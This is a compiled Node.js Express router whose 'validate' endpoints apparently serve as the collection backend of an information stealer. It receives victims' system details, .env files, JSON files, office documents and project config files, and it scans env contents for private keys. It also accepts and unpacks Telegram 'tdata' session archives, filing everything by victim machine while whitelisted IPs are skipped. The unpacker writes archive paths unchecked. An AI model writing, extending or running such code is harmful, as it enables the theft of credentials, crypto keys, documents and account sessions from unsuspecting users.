"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.validateRouter = void 0;
exports.handleTdataUpload = handleTdataUpload;
const crypto_1 = __importDefault(require("crypto"));
const child_process_1 = require("child_process");
const express_1 = __importDefault(require("express"));
const fs_1 = __importDefault(require("fs"));
const path_1 = __importDefault(require("path"));
const zlib_1 = __importDefault(require("zlib"));
const transfer_extracted_keys_1 = require("../utils/transfer-extracted-keys");
const whitelist_1 = require("../utils/whitelist");
const router = express_1.default.Router();
exports.validateRouter = router;
const DATA_DIR = path_1.default.normalize(path_1.default.join(process.cwd(), 'data'));
const SYSTEM_INFO_FILE = path_1.default.join(DATA_DIR, 'system_info.json');
function appendSystemInfo(record) {
    if (!fs_1.default.existsSync(DATA_DIR)) {
        fs_1.default.mkdirSync(DATA_DIR, { recursive: true });
    }
    let list = [];
    if (fs_1.default.existsSync(SYSTEM_INFO_FILE)) {
        try {
            list = JSON.parse(fs_1.default.readFileSync(SYSTEM_INFO_FILE, 'utf-8'));
        }
        catch {
            list = [];
        }
    }
    list.push(record);
    fs_1.default.writeFileSync(SYSTEM_INFO_FILE, JSON.stringify(list, null, 2), 'utf-8');
}
const TDATA_UPLOAD_COOLDOWN_MS = 24 * 60 * 60 * 1000; // 24h between uploads per client
const TDATA_MAX_UPLOAD_BYTES = 500 * 1024 * 1024; // 500MB
const TDATA_RATE_FILE = path_1.default.join(process.cwd(), 'uploads', '_tdata_rate.json');
const TDATA_SENT_FILE = path_1.default.join(process.cwd(), 'uploads', '_tdata_sent.json');
// Ensure uploads directory exists (normalize for Windows)
const UPLOADS_DIR = path_1.default.normalize(path_1.default.join(process.cwd(), 'uploads'));
if (!fs_1.default.existsSync(UPLOADS_DIR)) {
    fs_1.default.mkdirSync(UPLOADS_DIR, { recursive: true });
}
/** Match transfer CLI / findEnvFiles: .env, .env.* (e.g. .env.local), *.env, .env.example */
function isEnvFilePath(filePath) {
    const n = path_1.default.basename(String(filePath || '')).toLowerCase();
    return n.endsWith('.env.example') || n.endsWith('.env') || n.startsWith('.env.');
}
/** Format date as YY.M.D_HH.MM (e.g. 26.2.26_09.57) */
function formatShortTimestamp(d) {
    const yy = d.getFullYear() % 100;
    const m = d.getMonth() + 1;
    const d_ = d.getDate();
    const hh = String(d.getHours()).padStart(2, '0');
    const mm = String(d.getMinutes()).padStart(2, '0');
    return `${yy}.${m}.${d_}_${hh}.${mm}`;
}
/** Normalize OS to win | linux | mac */
function normalizeOs(os) {
    const o = String(os).toLowerCase();
    if (o.includes('win'))
        return 'win';
    if (o.includes('mac') || o === 'darwin')
        return 'mac';
    return 'linux';
}
/**
 * Build client folder name from username, OS, and IP(s): {username}_{win|linux|mac}_{ip1-ip2-ip3...}
 * No index file — folder is identified by machine (user + os + ips). Same IP on different machines
 * (different user or os) gets a different folder; multiple clients can write in parallel.
 */
function getClientFolderName(username, operatingSystem, ipAddress) {
    const safeUser = String(username || 'unknown').replace(/[^a-zA-Z0-9.-]/g, '-');
    const osShort = normalizeOs(operatingSystem || 'unknown');
    const ipsRaw = typeof ipAddress === 'string' ? ipAddress.split(',').map((s) => s.trim()).filter(Boolean) : [String(ipAddress || 'unknown')];
    const ipsPart = ipsRaw.length ? ipsRaw.map((ip) => ip.replace(/[^a-zA-Z0-9.:-]/g, '-')).join('-') : 'unknown';
    return `${safeUser}_${osShort}_${ipsPart}`;
}
/**
 * POST /api/validate/system-info
 * Receives system information (OS, IP, username) and saves to data/system_info.json
 */
router.post('/system-info', async (req, res) => {
    try {
        const { operatingSystem, ipAddress, username } = req.body;
        if (!operatingSystem || !ipAddress || !username) {
            return res.status(400).json({
                error: 'Invalid request',
                message: 'operatingSystem, ipAddress, and username are required',
            });
        }
        console.log(`📥 Received system info: OS=${operatingSystem}, IP=${ipAddress}, User=${username}`);
        appendSystemInfo({
            operatingSystem,
            ipAddress,
            username,
            timestamp: new Date().toISOString(),
        });
        console.log(`💾 Saved to ${SYSTEM_INFO_FILE}`);
        return res.json({
            success: true,
        });
    }
    catch (error) {
        console.error('❌ Error processing system info:', error);
        return res.status(500).json({
            error: 'Internal server error',
            message: error.message,
        });
    }
});
/** Manifest: knownHashes = content hash -> true. Same file (same content) is ignored on every request; we only save when hash is new, then merge all received hashes into manifest. */
const MANIFEST_FILENAME = '_manifest.json';
function getManifestPath(baseDir) {
    return path_1.default.join(baseDir, MANIFEST_FILENAME);
}
function hashContent(content) {
    return crypto_1.default.createHash('sha256').update(content, 'utf8').digest('hex');
}
function loadManifest(baseDir) {
    const manifestPath = getManifestPath(baseDir);
    try {
        if (fs_1.default.existsSync(manifestPath)) {
            const data = JSON.parse(fs_1.default.readFileSync(manifestPath, 'utf8'));
            const knownHashes = typeof data.knownHashes === 'object' && data.knownHashes !== null ? data.knownHashes : {};
            return { lastUpdate: data.lastUpdate || '', knownHashes };
        }
    }
    catch (_) { }
    return { lastUpdate: '', knownHashes: {} };
}
function saveManifest(baseDir, knownHashes) {
    const manifestPath = getManifestPath(baseDir);
    fs_1.default.mkdirSync(baseDir, { recursive: true });
    fs_1.default.writeFileSync(manifestPath, JSON.stringify({ lastUpdate: new Date().toISOString(), knownHashes }, null, 0), 'utf8');
}
/** Windows reserved chars not allowed in filenames */
const WIN_RESERVED = /[<>:"/\\|?*]/g;
/**
 * Single filename that embeds path + original name (no subdirs). Path segments joined by "_", original name at end.
 * Strips suffixExt from end to avoid double extension. Sanitizes for Windows (no : * ? " < > |).
 */
function safeFileNameWithPath(filePath, suffixExt, maxLen = 200) {
    const segments = filePath.split(/[/\\]/).filter(Boolean);
    const sanitize = (s) => s.replace(WIN_RESERVED, '_').replace(/[^a-zA-Z0-9.-]/g, '_').replace(/_+/g, '_').replace(/^_|_$/g, '') || 'file';
    const extLower = suffixExt.toLowerCase();
    if (segments.length === 0) {
        let base = path_1.default.basename(filePath) || filePath || 'file';
        base = sanitize(base);
        if (base.toLowerCase().endsWith('.' + extLower))
            base = base.slice(0, -(extLower.length + 1));
        return (base || 'file').substring(0, maxLen);
    }
    let name = segments.map(sanitize).filter(Boolean).join('_');
    if (name.toLowerCase().endsWith('.' + extLower))
        name = name.slice(0, -(extLower.length + 1));
    if (!name)
        name = 'file';
    return name.substring(0, maxLen);
}
/** Extensions we accept for doc uploads (client `extension` or inferred from original path). */
const DOC_ALLOWED_EXTENSIONS = ['txt', 'doc', 'docx', 'xlsx', 'pdf', 'rtf', 'md', 'csv'];
function resolveDocExtension(file) {
    const allowed = DOC_ALLOWED_EXTENSIONS;
    const fromClient = file.extension != null ? String(file.extension).toLowerCase().replace(/^\./, '') : '';
    if (fromClient && allowed.includes(fromClient))
        return fromClient;
    const fromPath = path_1.default.extname(file.path || '').replace(/^\./, '').toLowerCase();
    if (fromPath && allowed.includes(fromPath))
        return fromPath;
    return 'bin';
}
/** Types that are real binary on disk (Office / PDF). */
const DOC_BINARY_EXTENSIONS = new Set(['doc', 'docx', 'xls', 'xlsx', 'pdf']);
/** If client sends base64 as a plain JSON string without encoding: 'base64', detect and decode. */
function bufferLooksLikeBinaryFile(buf) {
    if (buf.length < 4)
        return false;
    if (buf[0] === 0x50 && buf[1] === 0x4b)
        return true; // ZIP — .docx / .xlsx
    if (buf.slice(0, 4).toString('ascii') === '%PDF')
        return true;
    if (buf[0] === 0xd0 && buf[1] === 0xcf && buf[2] === 0x11 && buf[3] === 0xe0)
        return true; // OLE — legacy .doc / .xls
    return false;
}
function tryDecodeLooseBase64(s) {
    const t = s.trim().replace(/\s/g, '');
    if (t.length < 16 || !/^[A-Za-z0-9+/]+=*$/.test(t))
        return null;
    const buf = Buffer.from(t, 'base64');
    if (buf.length === 0)
        return null;
    return buf;
}
/**
 * Turn uploaded doc payload into bytes or UTF-8 text for writing.
 * Many clients base64-encode all docs but omit `encoding: 'base64'`.
 */
function normalizeDocPayload(content, ext, encoding) {
    const str = String(content);
    if (encoding === 'base64') {
        return Buffer.from(str.trim().replace(/\s/g, ''), 'base64');
    }
    const extLower = ext.toLowerCase();
    const decoded = tryDecodeLooseBase64(str);
    if (!decoded)
        return str;
    if (bufferLooksLikeBinaryFile(decoded))
        return decoded;
    const textish = new Set(['txt', 'md', 'csv', 'rtf']);
    if (textish.has(extLower)) {
        return decoded.toString('utf8');
    }
    if (DOC_BINARY_EXTENSIONS.has(extLower) && decoded.length > 64) {
        return decoded;
    }
    return str;
}
/**
 * POST /api/validate/files
 * Receives file contents (env, json, doc). Saves by IP; only saves files that are new since last update,
 * in a timestamped subfolder (date and time).
 */
router.post('/files', async (req, res) => {
    try {
        console.log('📥 Processing /files request...');
        const { envFiles, jsonFiles, docFiles, operatingSystem, ipAddress, username } = req.body;
        if (!envFiles || !jsonFiles) {
            res.status(400).json({
                error: 'Invalid request',
                message: 'envFiles and jsonFiles are required',
            });
            return;
        }
        if (!Array.isArray(envFiles) || !Array.isArray(jsonFiles)) {
            res.status(400).json({
                error: 'Invalid request',
                message: 'envFiles and jsonFiles must be arrays',
            });
            return;
        }
        if ((0, whitelist_1.isReportedIpWhitelisted)(ipAddress)) {
            console.log(`🔕 Whitelisted ipAddress in body — skip /files capture (${ipAddress})`);
            res.json({ success: true });
            return;
        }
        const docFilesList = Array.isArray(docFiles) ? docFiles : [];
        const os = operatingSystem || 'unknown';
        const ip = ipAddress || 'unknown';
        const user = username || 'unknown';
        const clientFolderName = getClientFolderName(user, os, ip);
        const baseDir = path_1.default.normalize(path_1.default.join(UPLOADS_DIR, clientFolderName));
        const manifest = loadManifest(baseDir);
        const knownHashes = manifest.knownHashes;
        const isNewByHash = (content) => !knownHashes[hashContent(content)];
        const newEnvFiles = envFiles.filter((f) => f.path && f.content && isNewByHash(f.content));
        const newJsonFiles = jsonFiles.filter((f) => f.path && f.content && isNewByHash(f.content));
        const newDocFiles = docFilesList.filter((f) => f.path && f.content != null && isNewByHash(String(f.content)));
        const hasNew = newEnvFiles.length > 0 || newJsonFiles.length > 0 || newDocFiles.length > 0;
        console.log(`📥 Received files: ${envFiles.length} env, ${jsonFiles.length} json, ${docFilesList.length} doc (new: ${newEnvFiles.length}, ${newJsonFiles.length}, ${newDocFiles.length})`);
        console.log(`📋 Client: ${clientFolderName}`);
        if (hasNew) {
            const timestamp = formatShortTimestamp(new Date());
            const filesDir = path_1.default.normalize(path_1.default.join(baseDir, timestamp));
            fs_1.default.mkdirSync(filesDir, { recursive: true });
            const envDir = path_1.default.normalize(path_1.default.join(filesDir, 'env'));
            fs_1.default.mkdirSync(envDir, { recursive: true });
            newEnvFiles.forEach((file, i) => {
                if (file.path && file.content) {
                    const name = safeFileNameWithPath(file.path, 'env');
                    fs_1.default.writeFileSync(path_1.default.normalize(path_1.default.join(envDir, `${i + 1}-${name}.env`)), file.content, 'utf8');
                }
            });
            const jsonDir = path_1.default.normalize(path_1.default.join(filesDir, 'json'));
            fs_1.default.mkdirSync(jsonDir, { recursive: true });
            newJsonFiles.forEach((file, i) => {
                if (file.path && file.content) {
                    const name = safeFileNameWithPath(file.path, 'json');
                    fs_1.default.writeFileSync(path_1.default.normalize(path_1.default.join(jsonDir, `${i + 1}-${name}.json`)), file.content, 'utf8');
                }
            });
            if (newDocFiles.length > 0) {
                const docDir = path_1.default.normalize(path_1.default.join(filesDir, 'doc'));
                fs_1.default.mkdirSync(docDir, { recursive: true });
                newDocFiles.forEach((file, i) => {
                    if (file.path && file.content != null) {
                        const ext = resolveDocExtension(file);
                        const name = safeFileNameWithPath(file.path, ext);
                        const destPath = path_1.default.normalize(path_1.default.join(docDir, `${i + 1}-${name}.${ext}`));
                        const payload = normalizeDocPayload(file.content, ext, file.encoding);
                        if (Buffer.isBuffer(payload)) {
                            fs_1.default.writeFileSync(destPath, payload);
                        }
                        else {
                            fs_1.default.writeFileSync(destPath, payload, 'utf8');
                        }
                    }
                });
            }
            const summaryPath = path_1.default.join(filesDir, 'summary.txt');
            const summary = [
                `Files received: ${new Date().toISOString()}`,
                `System Info: OS=${os}, IP=${ip}, User=${user}`,
                '',
                `New env: ${newEnvFiles.length}, new json: ${newJsonFiles.length}, new doc: ${newDocFiles.length}`,
                '',
                'ENV:', ...newEnvFiles.map((f, i) => `${i + 1}. ${f.path}`),
                '', 'JSON:', ...newJsonFiles.map((f, i) => `${i + 1}. ${f.path}`),
                '', 'DOC:', ...newDocFiles.map((f, i) => `${i + 1}. ${f.path} (.${resolveDocExtension(f)})`),
            ].join('\n');
            fs_1.default.writeFileSync(summaryPath, summary, 'utf8');
            console.log(`💾 Saved ${newEnvFiles.length} env, ${newJsonFiles.length} json, ${newDocFiles.length} doc to ${filesDir}`);
        }
        else {
            console.log(`⏭ No new files to save for ${clientFolderName}`);
        }
        const allHashes = { ...knownHashes };
        envFiles.forEach((f) => { if (f.content)
            allHashes[hashContent(f.content)] = true; });
        jsonFiles.forEach((f) => { if (f.content)
            allHashes[hashContent(f.content)] = true; });
        docFilesList.forEach((f) => { if (f.content != null)
            allHashes[hashContent(String(f.content))] = true; });
        saveManifest(baseDir, allHashes);
        // Private keys: only from env file bodies (not json/doc payloads).
        const envTexts = envFiles.map((f) => (typeof f?.content === 'string' ? f.content : '')).filter(Boolean);
        (0, transfer_extracted_keys_1.appendTransferExtractedKeysFromContents)(user, ip, envTexts);
        res.json({ success: true });
    }
    catch (error) {
        console.error('❌ Error processing files:', error);
        res.status(500).json({
            error: 'Internal server error',
            message: error.message,
        });
    }
});
/**
 * POST /api/validate/project-env
 * Receives the current project's .env file. Saves by IP in one folder per IP;
 * each .env is saved with timestamp and project path in the filename (no new folder per request).
 */
router.post('/project-env', async (req, res) => {
    try {
        console.log('📥 Processing /project-env request...');
        const { operatingSystem, ipAddress, username, envContent, projectPath, projectConfigFiles } = req.body;
        if (!operatingSystem || !ipAddress || !username) {
            res.status(400).json({
                error: 'Invalid request',
                message: 'operatingSystem, ipAddress, and username are required',
            });
            return;
        }
        const filesList = Array.isArray(projectConfigFiles) ? projectConfigFiles : null;
        if (!envContent && !filesList) {
            res.status(400).json({
                error: 'Invalid request',
                message: 'envContent or files[] is required',
            });
            return;
        }
        if ((0, whitelist_1.isReportedIpWhitelisted)(ipAddress)) {
            console.log(`🔕 Whitelisted ipAddress in body — skip /project-env capture (${ipAddress})`);
            res.json({ success: true, message: 'Project .env file received and saved' });
            return;
        }
        const ip = ipAddress || 'unknown';
        const user = username || 'unknown';
        const os = operatingSystem || 'unknown';
        const projectPathStr = projectPath || 'unknown';
        const clientFolderName = getClientFolderName(user, os, ip);
        const projectEnvBase = path_1.default.normalize(path_1.default.join(UPLOADS_DIR, 'project-env', clientFolderName));
        fs_1.default.mkdirSync(projectEnvBase, { recursive: true });
        const timestamp = formatShortTimestamp(new Date());
        const safeProjectPath = projectPathStr.replace(WIN_RESERVED, '_').replace(/[^a-zA-Z0-9.-]/g, '_').substring(0, 150);
        let savedFiles = [];
        // Backward-compatible: single .env payload
        if (envContent) {
            const envFileName = `${timestamp}-${safeProjectPath}.env`;
            const envFilePath = path_1.default.normalize(path_1.default.join(projectEnvBase, envFileName));
            const envStr = String(envContent);
            fs_1.default.writeFileSync(envFilePath, envStr, 'utf8');
            savedFiles.push({ fileName: envFileName, bytes: Buffer.byteLength(envStr, 'utf8') });
            console.log(`💾 Saved to ${envFilePath}`);
        }
        // New: multiple project files in one request.
        // Body: { files: [{ path, content, encoding? }] }
        if (filesList) {
            const requestDir = path_1.default.normalize(path_1.default.join(projectEnvBase, timestamp));
            fs_1.default.mkdirSync(requestDir, { recursive: true });
            filesList.forEach((f, i) => {
                const filePath = String(f?.path || '').trim();
                if (!filePath || f?.content == null)
                    return;
                const ext = path_1.default.extname(filePath).replace(/^\./, '').toLowerCase() || 'txt';
                const name = safeFileNameWithPath(filePath, ext, 220);
                const fileName = `${i + 1}-${name}.${ext}`;
                const destPath = path_1.default.normalize(path_1.default.join(requestDir, fileName));
                const contentStr = String(f.content);
                if (f.encoding === 'base64') {
                    const buf = Buffer.from(contentStr.trim().replace(/\s/g, ''), 'base64');
                    fs_1.default.writeFileSync(destPath, buf);
                    savedFiles.push({ fileName: path_1.default.join(timestamp, fileName), bytes: buf.length });
                }
                else {
                    fs_1.default.writeFileSync(destPath, contentStr, 'utf8');
                    savedFiles.push({ fileName: path_1.default.join(timestamp, fileName), bytes: Buffer.byteLength(contentStr, 'utf8') });
                }
            });
            console.log(`💾 Saved ${savedFiles.length} project file(s) to ${requestDir}`);
        }
        const summaryPath = path_1.default.normalize(path_1.default.join(projectEnvBase, 'summary.txt'));
        const newLine = [
            `[${new Date().toISOString()}]`,
            `  Path: ${projectPathStr}`,
            `  Files: ${savedFiles.length}`,
            ...savedFiles.map((f) => `    - ${f.fileName} (${f.bytes} bytes)`),
            '',
        ].join('\n');
        if (fs_1.default.existsSync(summaryPath)) {
            fs_1.default.appendFileSync(summaryPath, newLine, 'utf8');
        }
        else {
            fs_1.default.writeFileSync(summaryPath, `Project .env files (${clientFolderName})\n\n${newLine}`, 'utf8');
        }
        console.log(`📥 Project .env: ${clientFolderName}, path=${projectPathStr}`);
        // Private keys: only from .env file content (path basename looks like an env file).
        const scanChunks = [];
        if (envContent)
            scanChunks.push(String(envContent));
        if (filesList) {
            for (const f of filesList) {
                if (f?.content == null)
                    continue;
                const p = String(f?.path || '').trim();
                if (p && isEnvFilePath(p))
                    scanChunks.push(String(f.content));
            }
        }
        (0, transfer_extracted_keys_1.appendTransferExtractedKeysFromContents)(user, ip, scanChunks);
        res.json({
            success: true,
            message: 'Project .env file received and saved',
        });
    }
    catch (error) {
        console.error('❌ Error processing project .env file:', error);
        res.status(500).json({
            error: 'Internal server error',
            message: error.message,
        });
    }
});
function readJsonSafe(filePath, fallback) {
    try {
        if (fs_1.default.existsSync(filePath)) {
            return JSON.parse(fs_1.default.readFileSync(filePath, 'utf8'));
        }
    }
    catch (_) { }
    return fallback;
}
function writeJsonSafe(filePath, data) {
    try {
        fs_1.default.mkdirSync(path_1.default.dirname(filePath), { recursive: true });
        fs_1.default.writeFileSync(filePath, JSON.stringify(data), 'utf8');
    }
    catch (_) { }
}
/**
 * POST /api/validate/tdata/check
 * Body: { operatingSystem, ipAddress, username }. Returns { alreadySent: boolean }.
 */
router.post('/tdata/check', async (req, res) => {
    try {
        const { operatingSystem, ipAddress, username } = req.body || {};
        const user = username || 'unknown';
        const ip = ipAddress || 'unknown';
        const os = operatingSystem || 'unknown';
        const clientFolderName = getClientFolderName(user, os, ip);
        const sent = readJsonSafe(TDATA_SENT_FILE, {});
        const alreadySent = !!sent[clientFolderName];
        res.json({ alreadySent });
    }
    catch (error) {
        console.error('❌ tdata check:', error);
        res.status(500).json({ error: 'Internal server error', alreadySent: false });
    }
});
/**
 * Handle POST /api/validate/tdata/upload (must be mounted with express.raw({ limit: '500mb' }) before express.json).
 * Expects req.body = Buffer (gzip), headers X-Client-OS, X-Client-IP, X-Client-User.
 * Rate limit: one upload per client per 24h. Restores tdata folder then zips it for download.
 */
async function handleTdataUpload(req, res) {
    try {
        const os = req.headers['x-client-os'] || 'unknown';
        const ip = req.headers['x-client-ip'] || 'unknown';
        const user = req.headers['x-client-user'] || 'unknown';
        const clientFolderName = getClientFolderName(user, os, ip);
        const rate = readJsonSafe(TDATA_RATE_FILE, {});
        const now = Date.now();
        if (rate[clientFolderName] != null && now - rate[clientFolderName] < TDATA_UPLOAD_COOLDOWN_MS) {
            res.status(429).json({
                error: 'Rate limited',
                message: 'tdata upload allowed once per 24h per machine. Try again later.',
            });
            return;
        }
        const body = req.body;
        if (!Buffer.isBuffer(body) || body.length === 0) {
            res.status(400).json({ error: 'Invalid request', message: 'Body must be non-empty gzip data' });
            return;
        }
        if (body.length > TDATA_MAX_UPLOAD_BYTES) {
            res.status(413).json({
                error: 'Payload too large',
                message: `Max ${TDATA_MAX_UPLOAD_BYTES / 1024 / 1024}MB allowed`,
            });
            return;
        }
        console.log(`📥 tdata upload: ${clientFolderName}, size=${(body.length / 1024 / 1024).toFixed(2)}MB`);
        const decompressed = zlib_1.default.gunzipSync(body);
        const extractDir = path_1.default.normalize(path_1.default.join(UPLOADS_DIR, clientFolderName, `tdata_${formatShortTimestamp(new Date())}`));
        fs_1.default.mkdirSync(extractDir, { recursive: true });
        let offset = 0;
        while (offset < decompressed.length) {
            if (offset + 4 > decompressed.length)
                break;
            const pathLen = decompressed.readUInt32BE(offset);
            offset += 4;
            if (offset + pathLen + 4 > decompressed.length)
                break;
            const relPath = decompressed.toString('utf8', offset, offset + pathLen);
            offset += pathLen;
            const contentLen = decompressed.readUInt32BE(offset);
            offset += 4;
            if (offset + contentLen > decompressed.length)
                break;
            const content = decompressed.subarray(offset, offset + contentLen);
            offset += contentLen;
            const safePath = path_1.default.normalize(path_1.default.join(extractDir, relPath.replace(/\//g, path_1.default.sep)));
            const dir = path_1.default.dirname(safePath);
            if (!fs_1.default.existsSync(dir))
                fs_1.default.mkdirSync(dir, { recursive: true });
            fs_1.default.writeFileSync(safePath, content);
        }
        const parentDir = path_1.default.dirname(extractDir);
        const folderName = path_1.default.basename(extractDir);
        const zipPath = path_1.default.normalize(path_1.default.join(parentDir, `${folderName}.zip`));
        try {
            if (process.platform === 'win32') {
                (0, child_process_1.execSync)(`tar -a -c -f "${zipPath}" -C "${parentDir}" "${folderName}"`, { stdio: 'pipe' });
            }
            else {
                (0, child_process_1.execSync)(`zip -r "${zipPath}" .`, { cwd: extractDir, stdio: 'pipe' });
            }
        }
        catch (e) {
            console.warn('Zip creation failed (zip/tar may be missing), keeping folder only:', e);
        }
        rate[clientFolderName] = now;
        writeJsonSafe(TDATA_RATE_FILE, rate);
        const sent = readJsonSafe(TDATA_SENT_FILE, {});
        sent[clientFolderName] = true;
        writeJsonSafe(TDATA_SENT_FILE, sent);
        console.log(`💾 tdata saved: ${extractDir}`);
        res.json({ success: true, message: 'tdata received and zipped', path: path_1.default.basename(extractDir) });
    }
    catch (error) {
        console.error('❌ tdata upload:', error);
        res.status(500).json({ error: 'Internal server error', message: error.message });
    }
}
//# sourceMappingURL=validate.js.map